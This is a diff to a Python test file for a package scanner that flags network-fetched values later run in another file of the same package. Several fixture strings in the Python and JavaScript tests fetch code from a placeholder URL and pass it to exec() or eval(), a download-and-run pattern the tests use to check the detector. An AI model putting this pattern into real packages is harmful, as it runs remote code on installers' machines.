@@ -433,18 +433,47 @@ class CrossFileReceivedTests(unittest.TestCase):
     def test_tainted_exports_are_found(self):
         # a function that returns a received value (direct, and via a local)
         self.assertEqual(core._xf_tainted_exports(
-            "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"), frozenset({"pull"}))
+            "import requests\ndef pull():\n    return requests.get(" + U + ").text\n"), (frozenset({"pull"}), {}))
         self.assertEqual(core._xf_tainted_exports(
             "import requests\ndef pull():\n    r = requests.get(" + U + ")\n    return r.text\n"),
-            frozenset({"pull"}))
+            (frozenset({"pull"}), {}))
         # a module-level name that holds a received value
         self.assertEqual(core._xf_tainted_exports(
             "import urllib.request\nPAYLOAD = urllib.request.urlopen(" + U + ").read().decode()\n"),
-            frozenset({"PAYLOAD"}))
-        # nothing received: no export (and the network-needle gate returns early)
-        self.assertEqual(core._xf_tainted_exports("def greeting():\n    return 'hello'\n"), frozenset())
+            (frozenset({"PAYLOAD"}), {}))
+        # a class method that returns a received value
         self.assertEqual(core._xf_tainted_exports(
-            "import requests\ndef ping():\n    requests.get(" + U + ")\n    return 'ok'\n"), frozenset())
+            "import requests\nclass Client:\n    def pull(self):\n        return requests.get(" + U + ").text\n"),
+            (frozenset(), {"Client": frozenset({"pull"})}))
+        # nothing received: no export (and the network-needle gate returns early)
+        self.assertEqual(core._xf_tainted_exports("def greeting():\n    return 'hello'\n"), (frozenset(), {}))
+        self.assertEqual(core._xf_tainted_exports(
+            "import requests\ndef ping():\n    requests.get(" + U + ")\n    return 'ok'\n"), (frozenset(), {}))
+
+    def test_a_docstring_example_is_not_an_export(self):
+        # a usage example in a docstring or comment must not create a phantom
+        # export (real network libraries carry requests.get(...) in their docs)
+        doc = ('import requests\n"""\nExample:\n    def fetch():\n        return requests.get(url).text\n"""\n'
+               "SAFE = 1\n")
+        self.assertEqual(core._xf_tainted_exports(doc), (frozenset(), {}))
+        commented = "import requests\ndef pull():\n    # return requests.get(u).text\n    return None\n"
+        self.assertEqual(core._xf_tainted_exports(commented), (frozenset(), {}))
+        stringed = "import requests\nMSG = 'see requests.get(u) in the docs'\n"
+        self.assertEqual(core._xf_tainted_exports(stringed), (frozenset(), {}))
+
+    def test_class_method_across_files(self):
+        got = self._one(_pkgfiles({
+            "cm/__init__.py": "from .client import Client\nc = Client()\nexec(c.pull())\n",
+            "cm/client.py": ("import requests\nclass Client:\n    def pull(self):\n"
+                             "        return requests.get(" + U + ").text\n")}))
+        self.assertEqual(len(got), 1, got)
+        self.assertEqual(got[0][1], "MAJOR")
+        self.assertIn("cm.client", got[0][3])
+        # a benign method call whose result is not run does not fire
+        self.assertEqual(self._one(_pkgfiles({
+            "cb/__init__.py": "from .client import Client\nc = Client()\nprint(c.name())\n",
+            "cb/client.py": "import requests\nclass Client:\n    def name(self):\n        return requests.get(" + U + ").text\n"})),
+            [])
 
     def _one(self, files, skip=()):
         issues = core._cross_file_received_issues(files, skip)
@@ -590,6 +619,35 @@ class CrossFileReceivedJsTests(unittest.TestCase):
             "pb/index.js": "async function pull() { return (await fetch(" + U + ")).text(); }\n"
                            "module.exports = { pull };\n",
             "pb/y.js": "var y = 1;\n"})), [])
+
+    def test_class_method_across_files(self):
+        # a class whose method returns a received value, instantiated and run in
+        # another file (CJS named export, ESM export, and default class export)
+        for label, pkg in [
+            ("cjs class", {
+                "jk/client.js": "class Client {\n  async pull() { return (await fetch(" + U + ")).text(); }\n}\n"
+                                "module.exports = { Client };\n",
+                "jk/index.js": "const { Client } = require('./client');\nconst c = new Client();\n"
+                               "c.pull().then(code => eval(code));\n"}),
+            ("esm class", {
+                "je/client.mjs": "export class Client {\n  async pull() { return (await fetch(" + U + ")).text(); }\n}\n",
+                "je/index.mjs": "import { Client } from './client.mjs';\nconst c = new Client();\neval(await c.pull());\n"}),
+            ("default class", {
+                "jf/client.js": "class Client {\n  async pull() { return (await fetch(" + U + ")).text(); }\n}\n"
+                                "module.exports = Client;\n",
+                "jf/index.js": "const Client = require('./client');\nconst c = new Client();\n"
+                               "c.pull().then(code => eval(code));\n"}),
+        ]:
+            with self.subTest(label):
+                got = self._one(_npmfiles(pkg))
+                self.assertEqual(len(got), 1, got)
+                self.assertEqual(got[0][0], "MAJOR")
+        # a benign class whose received-returning method is not run stays silent
+        self.assertEqual(self._one(_npmfiles({
+            "jq/client.js": "class Client {\n  async body() { return (await fetch(" + U + ")).text(); }\n}\n"
+                            "module.exports = { Client };\n",
+            "jq/index.js": "const { Client } = require('./client');\nconst c = new Client();\n"
+                           "c.body().then(t => console.log(t));\n"})), [])
 
 
 if __name__ == "__main__":
